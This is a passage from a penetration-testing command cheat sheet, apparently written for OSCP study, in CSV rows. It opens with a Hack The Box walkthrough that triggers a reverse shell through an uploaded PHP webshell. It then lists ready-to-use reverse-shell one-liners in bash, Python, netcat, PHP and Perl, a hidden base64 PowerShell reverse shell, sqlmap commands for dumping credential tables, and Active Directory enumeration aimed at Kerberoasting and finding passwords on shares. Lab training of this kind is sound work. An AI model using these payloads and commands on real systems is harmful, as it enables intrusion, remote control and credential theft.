   curl 'http://target/uploads/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'

3. Receive connection
   Connection from 10.10.11.18:54321
   www-data@target:/$

4. Upgrade to PTY
   python3 -c 'import pty; pty.spawn(""/bin/bash"")'
   Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm

5. Begin enumeration
   whoami, id, sudo -l, ls -la /home

Reverse shell payloads:
(1) Bash TCP (THIS COMMAND)
    bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
    → Most common, works on most Linux

(2) Bash UDP  
    bash -c 'bash -i >& /dev/udp/LHOST/LPORT 0>&1'
    → Alternative if TCP blocked

(3) Python3
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
    → When bash not available

(4) Python2
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'

(5) Netcat (traditional)
    nc LHOST LPORT -e /bin/bash
    → If nc compiled with -e support

(6) Netcat (no -e)
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
    → Works on all nc versions

(7) PHP
    php -r '$sock=fsockopen(""LHOST"",LPORT);exec(""/bin/sh -i <&3 >&3 2>&3"");'

(8) Perl
    perl -e 'use Socket;$i=""LHOST"";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'

URL encoding for curl:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
→ bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27

Full command (properly encoded):
curl 'http://target/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F9001%200%3E%261%27'

Or use revshells.com:
1. Visit https://www.revshells.com/
2. Select ""Bash TCP""
3. Enter LHOST and LPORT
4. Copy URL-encoded payload
5. Paste into webshell URL

Troubleshooting no connection:
(1) Verify listener running
    netstat -tulpn | grep 9001
    → Should show LISTEN

(2) Check target can reach attacker
    # Via webshell
    curl 'http://target/shell.php?cmd=ping -c 1 10.10.14.5'
    → Verify ICMP

(3) Try different ports
    Common egress ports: 80, 443, 53, 8080, 8443
    nc -lvnp 443  # Attacker (requires root for <1024)
    # Update payload with new port

(4) Try alternative payload
    Python instead of bash
    UDP instead of TCP
    Socat for encrypted shell

(5) Check firewall rules
    # Via webshell
    curl 'http://target/shell.php?cmd=iptables -L'
    → Check OUTPUT chain

Multiple attempts:
# Try ports 80, 443, 53, 9001
for port in 80 443 53 9001; do
  echo ""[+] Trying port $port""
  nc -lvnp $port &
  sleep 2
  curl ""http://target/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/$port 0>&1'""
  sleep 5
  killall nc
done

OSCP HackTheBox Usage workflow:
1. Webshell uploaded: http://usage.htb/avatars/shell.php
2. Start listener:
   nc -lvnp 9001
3. Execute reverse shell (THIS COMMAND):
   curl 'http://usage.htb/avatars/shell.php?cmd=bash -c ""bash -i >& /dev/tcp/10.10.14.5/9001 0>&1""'
4. Connection received:
   www-data@usage:/$
5. Upgrade shell:
   python3 -c 'import pty; pty.spawn(""/bin/bash"")'
   Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
6. Enumerate:
   whoami → www-data
   id → uid=33(www-data)
   ls -la /home → Users: dash, xander

OSCP exam tip: Have reverse shell payload ready before exam (save in notes). Use revshells.com for URL-encoded payloads. Try port 443 first (commonly allowed outbound). Immediately upgrade to PTY after connection. If reverse shell fails, continue with webshell but prioritize finding egress path.

Time estimate: 30 seconds (execution) + 30 seconds (shell upgrade)","high"
"sqlmap-from-request","SQLMap from Request File","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch","Run SQLMap using saved HTTP request file from Burp Suite (preserves headers, cookies, POST data)","sql-injection","CRITICAL OSCP technique: Using request files preserves ALL HTTP context.

Why use -r instead of -u:
(1) Preserves custom headers
(2) Maintains session cookies
(3) Preserves exact POST data format
(4) Captures Content-Type

Creating request file from Burp:
1. Intercept request in Burp Proxy
2. Right-click → Copy to file
3. Save as .req file (e.g., reset.req)
4. Run sqlmap -r reset.req

OSCP TIP: ALWAYS test manually first with single quote. Document findings before using sqlmap.

Time estimate: 5-10 minutes","high"
"sqlmap-from-request-level3","SQLMap from Request with Level 3","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch --level 3","Run SQLMap with increased test depth (level 3) for detecting complex/blind SQL injection that default level misses","sql-injection","CRITICAL OSCP LESSON from HackTheBox Usage machine:

DEFAULT SQLMAP (--level 1) FAILED to detect blind SQLi.
MANUAL TESTING confirmed vulnerability.
SOLUTION: --level 3 successfully detected it.

Level 1 (default): ~100 payloads, basic GET/POST
Level 3: ~500 payloads, adds headers, more variations

Time estimate:
Level 1: 5-10 minutes
Level 3: 15-30 minutes

Trust manual verification over tool defaults.
Document in failed_attempts.md.","high"
"sqlmap-enumerate-databases","SQLMap Enumerate Databases","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch --dbs","Enumerate all database names on target server (first step after confirming SQL injection)","sql-injection","Standard sqlmap workflow:
1. Confirm SQLi
2. Enumerate databases (THIS COMMAND)
3. Enumerate tables
4. Dump data

Ignore system databases (information_schema, mysql, postgres, master).
Focus on application databases.

Time estimate: 1-5 minutes","high"
"sqlmap-enumerate-tables","SQLMap Enumerate Tables","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch -D <DATABASE> --tables","Enumerate all table names in specified database (step 2 after database enumeration)","sql-injection","High-value table names (OSCP targets):
- users, admin, accounts
- credentials, passwords, config

Prioritization:
1. Dump authentication tables first
2. Then credentials/config
3. Application data if needed

OSCP tip: Don't enumerate ALL tables. Target high-value first.

Time estimate: 1-3 minutes (UNION), 10-20 minutes (blind)","high"
"sqlmap-dump-table","SQLMap Dump Table Data","web","sqlmap -r <REQUEST_FILE> -p <PARAMETER> --batch -D <DATABASE> -T <TABLE> --dump","Dump complete contents of specified table including all columns and rows (final step to extract credentials/data)","sql-injection","Final step in SQL injection exploitation.

Output location: ~/.local/share/sqlmap/output/<TARGET>/dump/<DATABASE>/<TABLE>.csv

Post-dump actions:
1. Check for plaintext passwords
2. Crack hashes with john/hashcat
3. Test credentials on SSH, admin panels, other services
4. Check for password reuse

Time estimate:
UNION: 30 sec - 2 min (100 rows)
Boolean blind: 10-30 min

Document in breakthrough.md.","high"
"curl-wordpress-version-feed","WordPress Version Detection via Feed","web","curl -s <URL>/feed/ | grep generator","Detect WordPress version by parsing RSS feed generator tag","cms-enumeration","RSS feed at /feed/ contains <generator> tag with WordPress version.

Example:
<generator>https://wordpress.org/?v=5.8.1</generator>.

More comprehensive:
wpscan --url <URL> --enumerate vp,vt,u","high"
"ps-reverse-shell-base64","PowerShell Base64 Encoded Reverse Shell","SHELLS","powershell -nop -w hidden -e <BASE64_PAYLOAD>","Base64-encoded PowerShell reverse shell for obfuscation and easy command-line execution","REVERSE_SHELL","",""
"ps-reverse-shell-encoder-python","Python Script - PowerShell Reverse Shell Base64 Encoder","SHELLS","python3 encode.py","Python script to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT","PAYLOAD_GENERATION","",""
"powerview-get-netdomain","Get Domain Information (PowerView)","enumeration","Get-NetDomain","Retrieve current domain information including forest, domain controllers, PDC, and domain properties using PowerView","","POWERVIEW SIMPLIFICATION:
Simplifies .NET LDAP queries into easy cmdlets.

EQUIVALENT TO:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

RETURNS CRITICAL PROPERTIES:
- PdcRoleOwner:
Target for enumeration
- DomainMode:
Functional level
- Forest:
Multi-domain environments

OSCP:
Import PowerView at start of AD enumeration.

ALTERNATIVE:
  $env:userdnsdomain

Time:
<5 seconds","high"
"powerview-get-netdomaincontroller","Enumerate Domain Controllers (PowerView)","enumeration","Get-NetDomainController","List all domain controllers in the current domain with IP addresses, OS versions, and roles","","ENUMERATE ALL DOMAIN CONTROLLERS:
KEY PROPERTIES:
- IPAddress:
Direct targeting
- OSVersion:
Identify legacy DCs (2008, 2012)
- Forest:
Forest root (multi-domain)
- PdcRoleOwner:
PDC identification

OSCP:
Identify PDC from PdcRoleOwner field.
Use PDC for all subsequent enumeration (accuracy).

Time:
<5 seconds","high"
"powerview-get-netuser","Enumerate All Domain Users (PowerView)","enumeration","Get-NetUser","Retrieve all user accounts in the domain with all attributes displayed","","ENUMERATE ALL DOMAIN USERS:
WARNING:
Returns ALL attributes for ALL users.
Output can be overwhelming in large domains.

FILTER WITH SELECT:
  Get-NetUser | select samaccountname,pwdlastset,lastlogon

LOOK FOR:
- Dormant accounts:
Old lastlogon
- Weak passwords:
Old pwdlastset
- Admin accounts:
memberof contains Domain Admins

OSCP:
Pipe to select immediately (avoid overload).

Time:
10-30 seconds","high"
"powerview-get-netuser-filter","Get Specific Domain User (PowerView)","enumeration","Get-NetUser -Identity <USERNAME>","Retrieve detailed information about a specific domain user","","QUERY SPECIFIC USER:
Faster than Get-NetUser | Where-Object
Queries AD directly.

KEY ATTRIBUTES:
- memberof:
Group memberships (Domain Admins?)
- admincount:
1 = protected admin account
- pwdlastset:
Password age (old = weak)
- serviceprincipalname:
Kerberoastable?
- useraccountcontrol:
Account flags

OSCP:
Quickly profile high-value targets.

Time:
<5 seconds","high"
"powerview-get-netuser-spn","Find Kerberoastable Accounts (PowerView)","enumeration","Get-NetUser -SPN | select samaccountname,serviceprincipalname","Enumerate all user accounts with Service Principal Names registered (Kerberoastable targets)","","KERBEROASTING TARGETS:
SERVICE ACCOUNT CHARACTERISTICS:
- Elevated privileges (local admin, DB access)
- Weak passwords (rarely changed)

SPN FORMAT REVEALS SERVICE:
- HTTP/:
Web servers
- MSSQLSvc/:
SQL Server
- TERMSRV/:
RDP

KERBEROASTING WORKFLOW:
1.

Request service ticket (valid domain creds)

2.

Extract ticket (contains password hash)

3.

Crack offline (hashcat/john, no lockout)

OSCP:
Most reliable privesc technique.
Enumerate SPNs early.

Time:
5-10 seconds","high"
"powerview-get-netgroup","Enumerate All Domain Groups (PowerView)","enumeration","Get-NetGroup | select cn","List all security groups in the domain with clean output","","ENUMERATE ALL GROUPS:
DEFAULT HIGH-PRIVILEGE:
- Domain Admins:
Domain-wide admin
- Enterprise Admins:
Forest-wide admin
- Administrators:
Local admin on computers

CUSTOM GROUPS REVEAL STRUCTURE:
- IT_Admins
- SQL_DBAs
- Service_Accounts
- Management

OSCP:
Look for 'Admin', 'IT', 'Service', 'Management' in names.
Often have elevated privileges.

Time:
5-10 seconds","high"
"powerview-get-netgroup-specific","Get Specific Group Details (PowerView)","enumeration","Get-NetGroup -Identity ""<GROUPNAME>"" | select member","Retrieve members of a specific domain group","","MEMBER ATTRIBUTE FORMAT:
Distinguished names (LDAP), not usernames.

FORMAT:
- Users:
CN=username,CN=Users,DC=corp,DC=com
- Nested groups:
CN=groupname,CN=Users,DC=corp,DC=com

NESTED GROUP DETECTION:
DN starts with 'CN=' and contains 'CN=Users' = likely group.

BETTER ALTERNATIVE:
Get-NetGroupMember -Recurse (auto-resolves nested)

OSCP:
Domain Admins members = instant win.

Time:
<5 seconds","high"
"powerview-get-netgroupmember","Get Group Members Resolved (PowerView)","enumeration","Get-NetGroupMember -Identity ""<GROUPNAME>""","List group members with resolved usernames and object types (cleaner than Get-NetGroup)","","CLEANER OUTPUT:
Resolves DNs to usernames.
Shows object types (user vs group).

MEMBEROBJECTCLASS:
- user:
objectClass=user
- group:
objectClass=group (nested)

-RECURSE FLAG:
Automatically resolves nested groups.
Essential for finding all effective members.

OSCP:
Always use -Recurse for privileged groups.
Find hidden admin accounts in subgroups.

Time:
5-10 seconds","high"
"powerview-get-netcomputer","Enumerate Domain Computers (PowerView)","enumeration","Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion","List all domain-joined computers with OS information for targeting","","ALL DOMAIN COMPUTERS:
No network scanning required.

KEY FIELDS:
- operatingsystem:
Identify legacy (7, 2008)
- operatingsystemversion:
Exact build for CVE
- dnshostname:
FQDN for connections

FILTER EXAMPLES:
  Get-NetComputer -OperatingSystem '*Server*'
  Get-NetComputer -OperatingSystem '*2008*'

OSCP:
Focus on legacy OS and servers.
Higher misconfigurations/unpatched vulns.

Time:
10-30 seconds","high"
"powerview-get-netou","Enumerate Organizational Units (PowerView)","enumeration","Get-NetOU | select name,distinguishedname","List all Organizational Units to understand domain structure and delegation","","OUs ORGANIZE OBJECTS:
For management and GPO application.

COMMON OUs:
- Domain Controllers:
DCs
- Computers:
Workstations
- Servers:
Servers
- Custom:
By department/function

INTERESTING OUs:
- Service Accounts
- Privileged Users
- Disabled Users

OSCP:
Less critical than users/groups/computers.
Can reveal admin practices.

Time:
5-10 seconds","medium"
"powerview-get-netgpo","Enumerate Group Policy Objects (PowerView)","enumeration","Get-NetGPO | select displayname,whenchanged","List all Group Policy Objects in the domain to identify policies and configurations","","GPOs DEFINE SETTINGS:
- Password policies
- Software installation
- Scripts
- Security settings

DEFAULT DOMAIN POLICY:
Controls password requirements and lockout.

VULNERABILITIES:
- GPP passwords (cpassword attribute)
- Startup scripts with hardcoded creds
- Weak security settings

WHENCHANGED:
Recent changes = testing/debugging (weak security).

OSCP:
Find GPP passwords in SYSVOL.
Old vuln, still present in legacy.

Time:
5-10 seconds","medium"
"powerview-get-netforest","Get Forest Information (PowerView)","enumeration","Get-NetForest","Retrieve AD forest information including domains, global catalog, and forest functional level","","AD FORESTS:
One or more domains in trust relationship.

SINGLE DOMAIN:
Forest = Domain (little value).

MULTI-DOMAIN:
Reveals structure and trust relationships.

ENTERPRISE ADMINS:
Exists only in root domain.
Admin rights across ALL forest domains.

OSCP:
Most exams are single-domain.
Use for multi-domain scenarios.

ALTERNATIVE:
  [system.directoryservices.activedirectory.forest]::getcurrentforest()

Time:
<5 seconds","medium"
"powerview-get-netuser-all","Enumerate All Domain Users (PowerView)","enumeration","Get-NetUser | select samaccountname,description,pwdlastset,lastlogon","List all domain users with key properties using PowerView","","CHECK DESCRIPTION FIELDS:
Admins often store passwords there.

COMMON PATTERNS:
- 'temp password'
- 'default password'
- 'reset to'
- 'password:
Winter2023'

FILTER:
  | ? {$_.description -match 'password|pwd|pw'}","high"
"powerview-get-netcomputer-all","Enumerate All Domain Computers (PowerView)","enumeration","Get-NetComputer | select dnshostname,operatingsystem,lastlogon","List all domain computers with OS version and last logon","","TARGET OLDER OS:
Server 2008, 2012 - likely unpatched.

LASTLOGON:
Identify active machines.

FILTER:
  | ? {$_.operatingsystem -match 'Server 2008|2012'}","medium"
"powerview-get-netcomputer-ping","Find Live Domain Computers (PowerView)","enumeration","Get-NetComputer -Ping | select dnshostname","Enumerate domain computers and test connectivity with ICMP ping","","WARNING:
Slow on large domains (250+ computers).

USE FOR:
- Small environments
- Need only active targets

ALTERNATIVE:
Get all computers, then port scan.","medium"
"powerview-get-netgroup-recursive","Get Group Members Recursively (PowerView)","enumeration","Get-NetGroupMember -GroupName ""Domain Admins"" -Recurse","List all members of a group including nested group memberships","","Critical for identifying privilege escalation paths.

Nested groups often overlooked.

EXAMPLE CHAIN:
User → Helpdesk → ServerAdmins → Domain Admins

USE -RECURSE:
Finds all effective members through nested groups.","high"
"ps-get-current-domain","Get Current Domain (PowerShell)","enumeration","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","Retrieve current AD domain information including forest, domain controllers, and PDC role owner using .NET Framework","",".NET SYSTEM.DIRECTORYSERVICES:
Available in PowerShell by default (no imports needed).

COMMAND:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

RETURNS:
- PdcRoleOwner:
Primary DC for enumeration
- DomainControllers:
All DCs in domain
- Forest:
Multi-domain environments
- Name:
Domain DNS name

OSCP ADVANTAGE:
No PowerView or special tools required.
Works on any domain-joined Windows machine with PowerShell.

ALTERNATIVE:
  $env:userdnsdomain

Time:
<5 seconds","high"
"ps-get-pdc","Get Primary Domain Controller (PowerShell)","enumeration","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name","Extract the Primary Domain Controller hostname - the most authoritative DC for LDAP queries","","WHY TARGET THE PDC:
- Most authoritative and up-to-date AD data
- Only ONE PDC per domain
- Non-PDC DCs may have stale replication data

COMMAND:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

USAGE:
Store in variable:
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

OSCP:
Use this to build LDAP path for DirectorySearcher queries.

Time:
<5 seconds","high"
"ps-get-distinguished-name","Get Domain Distinguished Name (PowerShell)","enumeration","([adsi]'').distinguishedName","Retrieve the domain's Distinguished Name in LDAP format (DC=corp,DC=com)","","DISTINGUISHED NAMES (DN):
Unique identifiers in LDAP.

FORMAT:
CN=name,OU=container,DC=domain,DC=tld

READ RIGHT-TO-LEFT:
- DC components:
Domain (top of hierarchy)
- OU/CN components:
Location within domain

EXAMPLE:
Domain 'corp.com' → DN is 'DC=corp,DC=com'

COMMAND:
  ([adsi]'').distinguishedName

OSCP:
Required for building LDAP connection strings.

Time:
<5 seconds","high"
"ps-build-ldap-path","Build Complete LDAP Path (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $LDAP","Construct full LDAP path for DirectorySearcher queries by combining PDC hostname and Distinguished Name","","LDAP PATH FORMAT:
LDAP://HostName/DistinguishedName

COMPONENTS:
- HostName:
PDC for accuracy
- DistinguishedName:
Domain DN (searchbase)

TELLS DIRECTORYSEARCHER:
- WHERE to search:
PDC
- WHAT to search:
Entire domain from root

COMMAND:
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]'').distinguishedName
  $LDAP = ""LDAP://$PDC/$DN""
  $LDAP

OSCP:
Foundation for all manual LDAP enumeration.
Memorize this pattern.

Time:
5-10 seconds","high"
"ps-directorysearcher-users","Enumerate Users with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""samAccountType=805306368""; $dirsearcher.FindAll()","Search Active Directory for all user objects using DirectorySearcher .NET class with LDAP filter","","SAMACCOUNTTYPE VALUES:
- 805306368:
Users
- 805306369:
Computers  
- 268435456:
Groups

LDAP FILTER SYNTAX:
- (attribute=value):
Equality
- (attribute=*value*):
Wildcards
- (&(filter1)(filter2)):
AND
- (|(filter1)(filter2)):
OR

OUTPUT:
Contains ALL user attributes.
Pipe to select for clean output:
  | ForEach-Object {$_.Properties.samaccountname}

OSCP:
PowerView-free enumeration.
Works in restricted environments where imports blocked.

Time:
10-30 seconds","high"
"ps-directorysearcher-groups","Enumerate Groups with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""objectClass=group""; $result = $dirsearcher.FindAll(); foreach($group in $result){$group.properties | select {$_.cn},{$_.member}}","Search Active Directory for all group objects and display group names with members","","GROUP MEMBER ATTRIBUTE:
Contains distinguished names (DNs).

FORMAT:
- Users:
CN=username,CN=Users,DC=corp,DC=com
- Nested groups:
CN=groupname,CN=Users,DC=corp,DC=com

NESTED GROUP DETECTION:
If member DN contains 'CN=Users' or 'OU=' → likely a group.
Enumerate recursively to find all users.

OSCP TARGETS:
Look for groups with 'Admin', 'IT', 'Service' in CN.
Often have elevated privileges.

Time:
10-30 seconds","high"
"ps-directorysearcher-computers","Enumerate Computers with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""samAccountType=805306369""; $result = $dirsearcher.FindAll(); foreach($computer in $result){$computer.properties | select {$_.cn},{$_.operatingsystem},{$_.dnshostname}}","Search Active Directory for all computer objects and display hostnames with operating systems","","COMPUTER OBJECTS:
Reveal network topology without port scanning.

KEY ATTRIBUTES:
- operatingsystem:
Identify legacy systems (Windows 7, Server 2008)
- operatingsystemversion:
Exact build number
- lastLogon:
Active vs dormant computers
- dnshostname:
FQDN for connections

OSCP TARGETS:
Focus on legacy OS versions and servers.
Higher chance of unpatched vulnerabilities.

Time:
10-30 seconds","high"
"ps-ldapsearch-function","Reusable LDAP Search Function (PowerShell)","enumeration","function LDAPSearch { param ([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DistinguishedName""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }","Create reusable PowerShell function for LDAP queries - accepts LDAP filter as parameter","","REUSABLE LDAP FUNCTION:
Encapsulates all previous LDAP steps.

USAGE EXAMPLES:
- Users:
LDAPSearch ""(samAccountType=805306368)""
- Groups:
LDAPSearch ""(objectCategory=group)""
- Kerberoastable:
LDAPSearch ""(&(objectCategory=user)(servicePrincipalName=*))""

OSCP WORKFLOW:
1.

Save function to file:
function | Out-File LDAPSearch.ps1

2.

Import at start:
Import-Module .\LDAPSearch.ps1

3.

Use throughout enumeration

ADVANTAGE:
PowerView-free, exam-safe enumeration.
Eliminates repetitive typing.

Time:
Function creation 10 seconds, usage <5 seconds","high"
"ps-ldapsearch-users","LDAP Query All Users (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=user)""","Query all user objects using manual LDAP search function","","REQUIRES:
LDAPSearch function defined first.

RETURNS:
User AND computer objects (computers inherit from user class).

FILTER COMPUTERS:
- LDAP:
(&(objectClass=user)(!(objectClass=computer)))
- PowerShell:
| ? {$_.Properties.samaccountname -notmatch '\$$'}

Time:
<10 seconds","high"
"ps-ldapsearch-computers","LDAP Query All Computers (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=computer)""","Query all computer objects in the domain","","QUERY ALL COMPUTERS:
RETURNS:
- DNS hostname
- OS version
- Last logon
- Operating system details

USAGE:
  LDAPSearch -LDAPQuery ""(objectClass=computer)"" | select -ExpandProperty Properties | select dnshostname,operatingsystem

Time:
<10 seconds","medium"
"ps-ldapsearch-groups","LDAP Query All Groups (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=group)""","Query all group objects in the domain","","QUERY ALL GROUPS:
FOCUS ON:
- Domain Admins
- Enterprise Admins
- Administrators
- Custom admin groups

GET MEMBERS:
  $group.Properties.member

Time:
<10 seconds","medium"
"ps-ldapsearch-spns","LDAP Query Kerberoastable Accounts (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(&(objectClass=user)(servicePrincipalName=*))""","Query all user accounts with SPNs registered (Kerberoastable)","","KERBEROASTING TARGETS:
QUERY:
  LDAPSearch -LDAPQuery ""(&(objectClass=user)(servicePrincipalName=*))""

WHY THIS MATTERS:
User accounts with SPNs → can request TGS tickets.
TGS encrypted with service account password hash.
Crack offline, no account lockout.

NEXT STEPS:
- Request TGS tickets
- Extract with Rubeus/Mimikatz
- Crack with hashcat

Time:
<10 seconds","high"
"ps-ldapsearch-admins","LDAP Query Privileged Accounts (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(adminCount=1)""","Query all accounts with adminCount=1 (privileged accounts)","","ADMINCOUNT ATTRIBUTE:
QUERY:
  LDAPSearch -LDAPQuery ""(adminCount=1)""

WHAT IT MEANS:
Account is/was in privileged group.

ADMINSDHOLDER PROCESS:
Sets this flag on:
- Domain Admins
- Enterprise Admins  
- Account Operators
- Backup Operators
- Server Operators
- Other high-privilege groups

OSCP:
Identify privileged accounts for targeting.

Time:
<10 seconds","high"
"powerview-get-netsession","Enumerate Active Sessions (PowerView)","enumeration","Get-NetSession -ComputerName <TARGET>","List active user sessions on a remote computer using NetSessionEnum API","","NetSessionEnum API queries SrvsvcSessionInfo registry key on target.

Windows 11/Server 2022+ restrict access by default (only SYSTEM/Administrators can read).

Returns sessions created via SMB/file shares.

CName = source computer establishing the session, UserName = user account.

If you see admin sessions, target that source computer for credential theft (mimikatz, lsass dump).

OSCP:
Works on legacy systems (Windows 7, Server 2008-2016) but often fails on modern Windows.

Have alternatives ready.","high"
"powerview-get-netloggedon","Get Logged On Users (PowerView)","enumeration","Get-NetLoggedon -ComputerName <TARGET>","Enumerate users currently logged on to a remote computer (requires local admin or Remote Registry service)","","Uses Remote Registry service to query HKEY_USERS hive and enumerate loaded user profiles (= logged-on users).

Remote Registry is disabled by default on Windows 8+ workstations but enabled on servers (2012+).

Requires local admin OR Remote Registry service explicitly enabled.

More reliable than Get-NetSession on modern Windows.

Returns interactive logons (RDP, console) and service logons.

OSCP:
If you have local admin, this works.

If not, it likely fails.","high"
"powerview-find-localadminaccess","Find Local Admin Access (PowerView)","enumeration","Find-LocalAdminAccess","Scan the domain to identify computers where current user has local administrator privileges","","Connects to each domain computer's Service Control Manager (OpenServiceW function) with SC_MANAGER_ALL_ACCESS rights.

If connection succeeds, you have local admin.

Scans entire domain (slow in large environments - may take 5-15 minutes).

Results reveal lateral movement opportunities:
computers where you can execute code as admin, dump credentials, install backdoors.

OSCP:
Run this early to map attack surface.

Any system with admin access is a potential pivot point for credential theft.","high"
"powerview-find-domainshare","Find Domain Shares (PowerView)","enumeration","Find-DomainShare","Discover all file shares in the domain to identify accessible data and potential credential storage","","Returns all shares from all domain computers:
default shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and custom shares (data, backups, users).

Custom shares often contain sensitive data:
credentials in scripts, configuration files, password databases, backup files.

SYSVOL share always accessible (domain-wide readable) - search for GPP passwords (cpassword attribute in Groups.xml, ScheduledTasks.xml).

OSCP:
Always enumerate shares - common source of credentials and sensitive information.","high"
"powerview-find-domainshare-accessible","Find Accessible Domain Shares (PowerView)","enumeration","Find-DomainShare -CheckShareAccess","List only file shares you can actually access (tests read permissions)","","Automatically tests read access to every discovered share.

Much faster than manually testing each share.

Results are immediately actionable - you can access these shares.

Focus on non-standard shares (not ADMIN$, C$, IPC$).

Common findings:
user home directories, department shares (HR, Finance, IT), backup shares, application config shares.

OSCP:
Use this to quickly identify where you can read sensitive data.

Look for config files, scripts, and credentials.","high"
"sysinternals-psloggedon","PsLoggedOn (Sysinternals)","enumeration",".\PsLoggedon.exe \\<TARGET>","Sysinternals tool to enumerate logged-on users via Remote Registry (more reliable than PowerView on modern Windows)","","More reliable than PowerView's Get-NetLoggedon/Get-NetSession on modern Windows.

Uses two methods:
(1) Remote Registry (queries HKEY_USERS for loaded profiles), (2) NetSessionEnum (lists resource share sessions).

Remote Registry auto-starts when you connect if service is set to 'Manual' (default on servers).

Returns both interactive logons (RDP, console) and resource share logons (file shares).

OSCP:
Keep this in your toolkit - works when PowerView fails.

Especially useful on Windows Server targets.","high"
"net-view-shares","List Shares with net view","enumeration","net view \\<TARGET>","Built-in Windows command to list all shares on a remote computer","","Built-in Windows tool, available on all systems.

Lists both default shares (ADMIN$, C$, IPC$) and custom shares.

Does not test access - just lists share names.

Faster than PowerView for single-target enumeration.

Type field shows Disk (file share), Print (printer share), IPC (inter-process communication).

OSCP:
Use this for quick manual share enumeration when PowerView is unavailable or restricted.","high"
"test-share-access","Test Share Access","enumeration","dir \\<TARGET>\<SHARE>","Test read access to a network share using built-in Windows dir command","","Simple test for share accessibility.

If dir succeeds, you have at least read access.

Recurse with /s to list all subdirectories and files.

Pipe to findstr to search for interesting files:
dir /s /b | findstr /I password config backup.

Check file timestamps to identify recently modified files (may contain current credentials).

OSCP:
Always test SYSVOL share first - domain-wide readable, often contains GPP passwords in Policies folder.","high"
"search-share-files","Search Share for Sensitive Files","enumeration","findstr /S /I /M /P ""<PATTERN>"" \\<TARGET>\<SHARE>\*.*","Recursively search files in a network share for sensitive patterns (passwords, credentials, config)","","Common search patterns:
password, pwd, pass, credential, key, secret, token, api_key, backup, config, admin.

Interesting file extensions:
.txt, .xml, .config, .ini, .bat, .ps1, .sql, .bak, .old.

Check SYSVOL\Policies for GPP passwords in Groups.xml and ScheduledTasks.xml.

Search for cpassword attribute.

OSCP:
This is how you find credentials in shares - systematic search beats manual browsing.","high"
